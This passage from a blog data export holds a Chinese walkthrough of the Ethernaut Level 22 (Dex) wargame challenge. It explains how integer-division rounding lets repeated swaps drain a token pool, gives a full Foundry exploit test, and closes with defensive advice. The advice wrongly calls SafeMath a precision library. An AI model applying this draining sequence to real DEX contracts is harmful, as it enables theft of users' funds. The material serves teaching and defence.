swapAll(address(token2), address(token1)); // 30 TKN2 -> 41 TKN1\n        swapAll(address(token1), address(token2)); // 41 TKN1 -> 65 TKN2\n        \n        // 最终一击\n        instance.swap(address(token2), address(token1), 45);\n\n        // 验证 Dex 中至少一种代币已被耗尽\n        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of one token\");\n\n        vm.stopPrank();\n    }\n\n    // 辅助函数，用于交换指定代币的全部余额\n    function swapAll(address tokenIn, address tokenOut) internal {\n        uint256 balance = IERC20(tokenIn).balanceOf(player);\n        instance.swap(tokenIn, tokenOut, balance);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **授权**: 授权 `Dex` 合约可以从你的地址转移 `Token1` 和 `Token2`。\n2.  **反复交换**: 在 `Token1` 和 `Token2` 之间来回交换你的全部余额。\n3.  **利用误差**: 每次交换都会因为整数除法的舍入而产生微小的利润。\n4.  **累积优势**: 重复交换，直到你拥有的代币数量足以一次性换走池中剩余的所有另一种代币。\n5.  **最终一击**: 执行最后一次交换，清空池子。\n\n## 🛡️ 防御措施\n\n1.  **避免价格操纵**: 简单的 `balanceOf(A) / balanceOf(B)` 价格公式极易受到操纵。现代DEX（如Uniswap V2）使用 `x * y = k` 的恒定乘积公式，这使得操纵价格的成本要高得多。\n2.  **处理舍入误差**: 在金融计算中，必须仔细处理精度问题。可以考虑：\n    *   将计算顺序调整为先乘后除，以减少精度损失。\n    *   使用更高精度的数学库，如 `SafeMath` 或专门的定点数库。\n3.  **使用去中心化预言机**: 对于需要可靠价格的应用，不应依赖于单个DEX池的瞬时价格。应使用更稳健的价格来源，如 Chainlink 或 Uniswap V3 的时间加权平均价格（TWAP）预言机。\n\n## 🔧 相关工具和技术\n\n-   **DEX (去中心化交易所)**: 一种基于智能合约的交易所，允许用户在没有中心化中介的情况下交易加密资产。\n-   **价格预言机 (Price Oracle)**: 为智能合约提供链下或链上资产价格信息的服务。\n-   **整数除法**: Solidity（以及许多其他编程语言）中整数除法向下舍入的特性，是许多数学相关漏洞的根源。\n\n## 🎯 总结\n\n**核心概念**:\n-   在智能合约中进行金融计算时，整数除法的舍入误差可能导致严重的漏洞。\n-   简单的、基于即时流动性的价格发现机制很容易被操纵。\n\n**攻击向量**:\n-   通过一系列精心设计的交易，利用并放大整数除法的舍入误差。\n-   逐渐积累优势，直到能够完全耗尽流动性池。\n\n**防御策略**:\n-   使用更成熟和抗操纵的定价模型（如恒定乘积模型）。\n-   在进行数学运算时，始终注意运算顺序和精度损失问题。\n-   对于关键应用，依赖于健壮的价格预言机，而不是易受攻击的即时价格。\n\n## 📚 参考资料\n\n-   [Uniswap V2 Whitepaper](https://uniswap.org/whitepaper.pdf)\n-   [Chainlink Price Feeds](https://docs.chain.link/docs/get-the-latest-price/)","source":"_posts/ethernaut-level-22-dex.md","raw":"---\ntitle: 'Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞'\ndate: 2025-01-25 16:55:00\nupdated: 2025-01-25 16:55:00\ncategories:\n  - Ethernaut 系列\n  - 高级攻击篇 (21-25)\ntags:\n  - Ethernaut\n  - Foundry\n  - DEX\n  - Price Manipulation\n  - Integer Division\n  - 智能合约安全\nseries: Ethernaut Foundry Solutions\nexcerpt: \"利用一个简易DEX中由于整数除法舍入误差导致的价格计算漏洞，通过多次小额交易来耗尽池中其中一种代币的流动性。学习如何通过反复交换来放大舍入误差，最终实现对价格的完全操纵。\"\n---\n\n# 🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞\n\n> **关卡链接**: [Ethernaut Level 22 - Dex](https://ethernaut.openzeppelin.com/level/22)  \n> **攻击类型**: 价格操纵 / 整数舍入漏洞  \n> **难度**: ⭐⭐⭐☆☆\n\n## 📋 挑战目标\n\n你和 `Dex` 合约最初都拥有 `Token1` 和 `Token2`。你的目标是耗尽 `Dex` 合约中 `Token1` 或 `Token2` 的全部流动性。\n\n-   **初始状态**: \n    -   Player: 10 TKN1, 10 TKN2\n    -   Dex: 100 TKN1, 100 TKN2\n\n![Dex Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg)\n\n## 🔍 漏洞分析\n\n这个 `Dex` 合约是一个极简的去中心化交易所，其核心漏洞在于它的价格计算函数 `getSwapPrice()`：\n\n```solidity\nfunction getSwapPrice(address from, address to, uint amount) public view returns(uint){\n    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));\n}\n```\n\n这个函数通过两种代币在池中余额的比例来计算交换价格。问题出在 Solidity 的整数除法上。整数除法会向下舍入到最接近的整数，任何小数部分都会被丢弃。例如，`7 / 2` 的结果是 `3`，而不是 `3.5`。\n\n我们可以利用这个舍入误差来获利。通过精心设计的交换顺序，我们可以在每次交换中获得比预期“公平”价格更多的代币，从而逐渐耗尽池中的资金。\n\n### 攻击流程\n\n我们的策略是通过在两种代币之间反复交换我们的全部余额来放大这个舍入误差。\n\n1.  **初始状态**: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). 价格比为 1:1。\n\n2.  **第一次交换 (10 TKN1 -> TKN2)**:\n    -   `amountOut = (10 * 100) / 100 = 10`\n    -   Player: (0 TKN1, 20 TKN2)\n    -   Dex: (110 TKN1, 90 TKN2)\n\n3.  **第二次交换 (20 TKN2 -> TKN1)**:\n    -   `amountOut = (20 * 110) / 90 = 24.44...` -> **舍入后为 24**\n    -   Player: (24 TKN1, 0 TKN2)\n    -   Dex: (86 TKN1, 110 TKN2)\n\n4.  **第三次交换 (24 TKN1 -> TKN2)**:\n    -   `amountOut = (24 * 110) / 86 = 30.69...` -> **舍入后为 30**\n    -   Player: (0 TKN1, 30 TKN2)\n    -   Dex: (110 TKN1, 80 TKN2)\n\n5.  **第四次交换 (30 TKN2 -> TKN1)**:\n    -   `amountOut = (30 * 110) / 80 = 41.25` -> **舍入后为 41**\n    -   Player: (41 TKN1, 0 TKN2)\n    -   Dex: (69 TKN1, 110 TKN2)\n\n6.  **第五次交换 (41 TKN1 -> TKN2)**:\n    -   `amountOut = (41 * 110) / 69 = 65.36...` -> **舍入后为 65**\n    -   Player: (0 TKN1, 65 TKN2)\n    -   Dex: (110 TKN1, 45 TKN2)\n\n现在，我们手上有65个TKN2，而Dex池中只剩下110个TKN1和45个TKN2。我们只需要用45个TKN2就可以换走池里所有的110个TKN1。\n\n7.  **最终交换 (45 TKN2 -> TKN1)**:\n    -   `amountOut = (45 * 110) / 45 = 110`\n    -   Player: (110 TKN1, 20 TKN2)\n    -   Dex: (0 TKN1, 90 TKN2) -> **TKN1 被耗尽！**\n\n通过这种方式，我们利用了整数除法的舍入误差，在每次交易中都获得了微小的优势，并最终将这种优势累积到足以清空整个池子。\n\n## 💻 Foundry 实现\n\n### Foundry 测试代码\n\n测试代码将模拟上述的交换流程。\n\n```solidity\n// SPDX-License-Identifier: Unlicense\npragma solidity ^0.8.0;\n\nimport \"forge-std/Test.sol\";\nimport \"src/22_Dex.sol\";\n\ncontract DexTest is Test {\n    Dex instance;\n    address player;\n    SwappableToken token1;\n    SwappableToken token2;\n\n    function setUp() public {\n        player = vm.addr(1);\n        instance = new Dex();\n\n        // 部署并设置代币\n        token1 = new SwappableToken(address(instance), \"Token 1\", \"TKN1\", 110);\n        token2 = new SwappableToken(address(instance), \"Token 2\", \"TKN2\", 110);\n        instance.setTokens(address(token1), address(token2));\n\n        // 添加流动性\n        token1.approve(address(instance), 100);\n        token2.approve(address(instance), 100);\n        instance.addLiquidity(address(token1), 100);\n        instance.addLiquidity(address(token2), 100);\n\n        // 发送初始代币给 player\n        token1.transfer(player, 10);\n        token2.transfer(player, 10);\n    }\n\n    function testDexAttack() public {\n        vm.startPrank(player);\n\n        // 授权 Dex 合约无限量的代币\n        token1.approve(address(instance), type(uint256).max);\n        token2.approve(address(instance), type(uint256).max);\n\n        // 执行攻击流程\n        swapAll(address(token1), address(token2)); // 10 TKN1 -> 10 TKN2\n        swapAll(address(token2), address(token1)); // 20 TKN2 -> 24 TKN1\n        swapAll(address(token1), address(token2)); // 24 TKN1 -> 30 TKN2\n        swapAll(address(token2), address(token1)); // 30 TKN2 -> 41 TKN1\n        swapAll(address(token1), address(token2)); // 41 TKN1 -> 65 TKN2\n        \n        // 最终一击\n        instance.swap(address(token2), address(token1), 45);\n\n        // 验证 Dex 中至少一种代币已被耗尽\n        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;\n        assertTrue(drained, \"Dex should be drained of one token\");\n\n        vm.stopPrank();\n    }\n\n    // 辅助函数，用于交换指定代币的全部余额\n    function swapAll(address tokenIn, address tokenOut) internal {\n        uint256 balance = IERC20(tokenIn).balanceOf(player);\n        instance.swap(tokenIn, tokenOut, balance);\n    }\n}\n```\n\n### 关键攻击步骤\n\n1.  **授权**: 授权 `Dex` 合约可以从你的地址转移 `Token1` 和 `Token2`。\n2.  **反复交换**: 在 `Token1` 和 `Token2` 之间来回交换你的全部余额。\n3.  **利用误差**: 每次交换都会因为整数除法的舍入而产生微小的利润。\n4.  **累积优势**: 重复交换，直到你拥有的代币数量足以一次性换走池中剩余的所有另一种代币。\n5.  **最终一击**: 执行最后一次交换，清空池子。\n\n## 🛡️ 防御措施\n\n1.  **避免价格操纵**: 简单的 `balanceOf(A) / balanceOf(B)` 价格公式极易受到操纵。现代DEX（如Uniswap V2）使用 `x * y = k` 的恒定乘积公式，这使得操纵价格的成本要高得多。\n2.  **处理舍入误差**: 在金融计算中，必须仔细处理精度问题。可以考虑：\n    *   将计算顺序调整为先乘后除，以减少精度损失。\n    *   使用更高精度的数学库，如 `SafeMath` 或专门的定点数库。\n3.  **使用去中心化预言机**: 对于需要可靠价格的应用，不应依赖于单个DEX池的瞬时价格。应使用更稳健的价格来源，如 Chainlink 或 Uniswap V3 的时间加权平均价格（TWAP）预言机。\n\n## 🔧 相关工具和技术\n\n-   **DEX (去中心化交易所)**: 一种基于智能合约的交易所，允许用户在没有中心化中介的情况下交易加密资产。\n-   **价格预言机 (Price Oracle)**: 为智能合约提供链下或链上资产价格信息的服务。\n-   **整数除法**: Solidity（以及许多其他编程语言）中整数除法向下舍入的特性，是许多数学相关漏洞的根源。\n\n## 🎯 总结\n\n**核心概念**:\n-   在智能合约中进行金融计算时，整数除法的舍入误差可能导致严重的漏洞。\n-   简单的、基于即时流动性的价格发现机制很容易被操纵。\n\n**攻击向量**:\n-   通过一系列精心设计的交易，利用并放大整数除法的舍入误差。\n-   逐渐积累优势，直到能够完全耗尽流动性池。\n\n**防御策略**:\n-   使用更成熟和抗操纵的定价模型（如恒定乘积模型）。\n-   在进行数学运算时，始终注意运算顺序和精度损失问题。\n-   对于关键应用，依赖于健壮的价格预言机，而不是易受攻击的即时价格。\n\n## 📚 参考资料\n\n-   [Uniswap V2 Whitepaper](https://uniswap.org/whitepaper.pdf)\n-   [Chainlink Price Feeds](https://docs.chain.link/docs/get-the-latest-price/)","slug":"ethernaut-level-22-dex","published":1,"comments":1,"layout":"post","photos":[],"_id":"cmfc7zbpj001lbf5qagmd0xw7","content":"<h1 id=\"🎯-Ethernaut-Level-22-Dex-价格操纵与整数舍入漏洞\"><a href=\"#🎯-Ethernaut-Level-22-Dex-价格操纵与整数舍入漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞\"></a>🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/22\">Ethernaut Level 22 - Dex</a><br><strong>攻击类型</strong>: 价格操纵 &#x2F; 整数舍入漏洞<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你和 <code>Dex</code> 合约最初都拥有 <code>Token1</code> 和 <code>Token2</code>。你的目标是耗尽 <code>Dex</code> 合约中 <code>Token1</code> 或 <code>Token2</code> 的全部流动性。</p>\n<ul>\n<li><strong>初始状态</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg\" alt=\"Dex Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这个 <code>Dex</code> 合约是一个极简的去中心化交易所，其核心漏洞在于它的价格计算函数 <code>getSwapPrice()</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class=\"line\">    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个函数通过两种代币在池中余额的比例来计算交换价格。问题出在 Solidity 的整数除法上。整数除法会向下舍入到最接近的整数，任何小数部分都会被丢弃。例如，<code>7 / 2</code> 的结果是 <code>3</code>，而不是 <code>3.5</code>。</p>\n<p>我们可以利用这个舍入误差来获利。通过精心设计的交换顺序，我们可以在每次交换中获得比预期“公平”价格更多的代币，从而逐渐耗尽池中的资金。</p>\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><p>我们的策略是通过在两种代币之间反复交换我们的全部余额来放大这个舍入误差。</p>\n<ol>\n<li><p><strong>初始状态</strong>: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). 价格比为 1:1。</p>\n</li>\n<li><p><strong>第一次交换 (10 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (10 * 100) / 100 = 10</code></li>\n<li>Player: (0 TKN1, 20 TKN2)</li>\n<li>Dex: (110 TKN1, 90 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第二次交换 (20 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (20 * 110) / 90 = 24.44...</code> -&gt; <strong>舍入后为 24</strong></li>\n<li>Player: (24 TKN1, 0 TKN2)</li>\n<li>Dex: (86 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第三次交换 (24 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (24 * 110) / 86 = 30.69...</code> -&gt; <strong>舍入后为 30</strong></li>\n<li>Player: (0 TKN1, 30 TKN2)</li>\n<li>Dex: (110 TKN1, 80 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第四次交换 (30 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (30 * 110) / 80 = 41.25</code> -&gt; <strong>舍入后为 41</strong></li>\n<li>Player: (41 TKN1, 0 TKN2)</li>\n<li>Dex: (69 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第五次交换 (41 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (41 * 110) / 69 = 65.36...</code> -&gt; <strong>舍入后为 65</strong></li>\n<li>Player: (0 TKN1, 65 TKN2)</li>\n<li>Dex: (110 TKN1, 45 TKN2)</li>\n</ul>\n</li>\n</ol>\n<p>现在，我们手上有65个TKN2，而Dex池中只剩下110个TKN1和45个TKN2。我们只需要用45个TKN2就可以换走池里所有的110个TKN1。</p>\n<ol start=\"7\">\n<li><strong>最终交换 (45 TKN2 -&gt; TKN1)</strong>:<ul>\n<li><code>amountOut = (45 * 110) / 45 = 110</code></li>\n<li>Player: (110 TKN1, 20 TKN2)</li>\n<li>Dex: (0 TKN1, 90 TKN2) -&gt; <strong>TKN1 被耗尽！</strong></li>\n</ul>\n</li>\n</ol>\n<p>通过这种方式，我们利用了整数除法的舍入误差，在每次交易中都获得了微小的优势，并最终将这种优势累积到足以清空整个池子。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将模拟上述的交换流程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/22_Dex.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract DexTest is Test &#123;</span><br><span class=\"line\">    Dex instance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    SwappableToken token1;</span><br><span class=\"line\">    SwappableToken token2;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        instance = new Dex();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 部署并设置代币</span><br><span class=\"line\">        token1 = new SwappableToken(address(instance), &quot;Token 1&quot;, &quot;TKN1&quot;, 110);</span><br><span class=\"line\">        token2 = new SwappableToken(address(instance), &quot;Token 2&quot;, &quot;TKN2&quot;, 110);</span><br><span class=\"line\">        instance.setTokens(address(token1), address(token2));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 添加流动性</span><br><span class=\"line\">        token1.approve(address(instance), 100);</span><br><span class=\"line\">        token2.approve(address(instance), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token1), 100);</span><br><span class=\"line\">        instance.addLiquidity(address(token2), 100);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 发送初始代币给 player</span><br><span class=\"line\">        token1.transfer(player, 10);</span><br><span class=\"line\">        token2.transfer(player, 10);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testDexAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 授权 Dex 合约无限量的代币</span><br><span class=\"line\">        token1.approve(address(instance), type(uint256).max);</span><br><span class=\"line\">        token2.approve(address(instance), type(uint256).max);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 执行攻击流程</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 10 TKN1 -&gt; 10 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 20 TKN2 -&gt; 24 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 24 TKN1 -&gt; 30 TKN2</span><br><span class=\"line\">        swapAll(address(token2), address(token1)); // 30 TKN2 -&gt; 41 TKN1</span><br><span class=\"line\">        swapAll(address(token1), address(token2)); // 41 TKN1 -&gt; 65 TKN2</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 最终一击</span><br><span class=\"line\">        instance.swap(address(token2), address(token1), 45);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 验证 Dex 中至少一种代币已被耗尽</span><br><span class=\"line\">        bool drained = token1.balanceOf(address(instance)) == 0 || token2.balanceOf(address(instance)) == 0;</span><br><span class=\"line\">        assertTrue(drained, &quot;Dex should be drained of one token&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // 辅助函数，用于交换指定代币的全部余额</span><br><span class=\"line\">    function swapAll(address tokenIn, address tokenOut) internal &#123;</span><br><span class=\"line\">        uint256 balance = IERC20(tokenIn).balanceOf(player);</span><br><span class=\"line\">        instance.swap(tokenIn, tokenOut, balance);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>授权</strong>: 授权 <code>Dex</code> 合约可以从你的地址转移 <code>Token1</code> 和 <code>Token2</code>。</li>\n<li><strong>反复交换</strong>: 在 <code>Token1</code> 和 <code>Token2</code> 之间来回交换你的全部余额。</li>\n<li><strong>利用误差</strong>: 每次交换都会因为整数除法的舍入而产生微小的利润。</li>\n<li><strong>累积优势</strong>: 重复交换，直到你拥有的代币数量足以一次性换走池中剩余的所有另一种代币。</li>\n<li><strong>最终一击</strong>: 执行最后一次交换，清空池子。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><strong>避免价格操纵</strong>: 简单的 <code>balanceOf(A) / balanceOf(B)</code> 价格公式极易受到操纵。现代DEX（如Uniswap V2）使用 <code>x * y = k</code> 的恒定乘积公式，这使得操纵价格的成本要高得多。</li>\n<li><strong>处理舍入误差</strong>: 在金融计算中，必须仔细处理精度问题。可以考虑：<ul>\n<li>将计算顺序调整为先乘后除，以减少精度损失。</li>\n<li>使用更高精度的数学库，如 <code>SafeMath</code> 或专门的定点数库。</li>\n</ul>\n</li>\n<li><strong>使用去中心化预言机</strong>: 对于需要可靠价格的应用，不应依赖于单个DEX池的瞬时价格。应使用更稳健的价格来源，如 Chainlink 或 Uniswap V3 的时间加权平均价格（TWAP）预言机。</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>DEX (去中心化交易所)</strong>: 一种基于智能合约的交易所，允许用户在没有中心化中介的情况下交易加密资产。</li>\n<li><strong>价格预言机 (Price Oracle)</strong>: 为智能合约提供链下或链上资产价格信息的服务。</li>\n<li><strong>整数除法</strong>: Solidity（以及许多其他编程语言）中整数除法向下舍入的特性，是许多数学相关漏洞的根源。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>在智能合约中进行金融计算时，整数除法的舍入误差可能导致严重的漏洞。</li>\n<li>简单的、基于即时流动性的价格发现机制很容易被操纵。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>通过一系列精心设计的交易，利用并放大整数除法的舍入误差。</li>\n<li>逐渐积累优势，直到能够完全耗尽流动性池。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>使用更成熟和抗操纵的定价模型（如恒定乘积模型）。</li>\n<li>在进行数学运算时，始终注意运算顺序和精度损失问题。</li>\n<li>对于关键应用，依赖于健壮的价格预言机，而不是易受攻击的即时价格。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://uniswap.org/whitepaper.pdf\">Uniswap V2 Whitepaper</a></li>\n<li><a href=\"https://docs.chain.link/docs/get-the-latest-price/\">Chainlink Price Feeds</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-22-Dex-价格操纵与整数舍入漏洞\"><a href=\"#🎯-Ethernaut-Level-22-Dex-价格操纵与整数舍入漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞\"></a>🎯 Ethernaut Level 22: Dex - 价格操纵与整数舍入漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/22\">Ethernaut Level 22 - Dex</a><br><strong>攻击类型</strong>: 价格操纵 &#x2F; 整数舍入漏洞<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>你和 <code>Dex</code> 合约最初都拥有 <code>Token1</code> 和 <code>Token2</code>。你的目标是耗尽 <code>Dex</code> 合约中 <code>Token1</code> 或 <code>Token2</code> 的全部流动性。</p>\n<ul>\n<li><strong>初始状态</strong>: <ul>\n<li>Player: 10 TKN1, 10 TKN2</li>\n<li>Dex: 100 TKN1, 100 TKN2</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel22.svg\" alt=\"Dex Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>这个 <code>Dex</code> 合约是一个极简的去中心化交易所，其核心漏洞在于它的价格计算函数 <code>getSwapPrice()</code>：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function getSwapPrice(address from, address to, uint amount) public view returns(uint)&#123;</span><br><span class=\"line\">    return((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个函数通过两种代币在池中余额的比例来计算交换价格。问题出在 Solidity 的整数除法上。整数除法会向下舍入到最接近的整数，任何小数部分都会被丢弃。例如，<code>7 / 2</code> 的结果是 <code>3</code>，而不是 <code>3.5</code>。</p>\n<p>我们可以利用这个舍入误差来获利。通过精心设计的交换顺序，我们可以在每次交换中获得比预期“公平”价格更多的代币，从而逐渐耗尽池中的资金。</p>\n<h3 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h3><p>我们的策略是通过在两种代币之间反复交换我们的全部余额来放大这个舍入误差。</p>\n<ol>\n<li><p><strong>初始状态</strong>: Player (10 TKN1, 10 TKN2), Dex (100 TKN1, 100 TKN2). 价格比为 1:1。</p>\n</li>\n<li><p><strong>第一次交换 (10 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (10 * 100) / 100 = 10</code></li>\n<li>Player: (0 TKN1, 20 TKN2)</li>\n<li>Dex: (110 TKN1, 90 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第二次交换 (20 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (20 * 110) / 90 = 24.44...</code> -&gt; <strong>舍入后为 24</strong></li>\n<li>Player: (24 TKN1, 0 TKN2)</li>\n<li>Dex: (86 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第三次交换 (24 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (24 * 110) / 86 = 30.69...</code> -&gt; <strong>舍入后为 30</strong></li>\n<li>Player: (0 TKN1, 30 TKN2)</li>\n<li>Dex: (110 TKN1, 80 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第四次交换 (30 TKN2 -&gt; TKN1)</strong>:</p>\n<ul>\n<li><code>amountOut = (30 * 110) / 80 = 41.25</code> -&gt; <strong>舍入后为 41</strong></li>\n<li>Player: (41 TKN1, 0 TKN2)</li>\n<li>Dex: (69 TKN1, 110 TKN2)</li>\n</ul>\n</li>\n<li><p><strong>第五次交换 (41 TKN1 -&gt; TKN2)</strong>:</p>\n<ul>\n<li><code>amountOut = (41 * 110) / 69 = 65.36...</code> -&gt; <strong>舍入后为 65</strong></li>\n<li>Player: (0 TKN1, 65 TKN2)</li>\n<li>Dex: (110 TKN1, 45 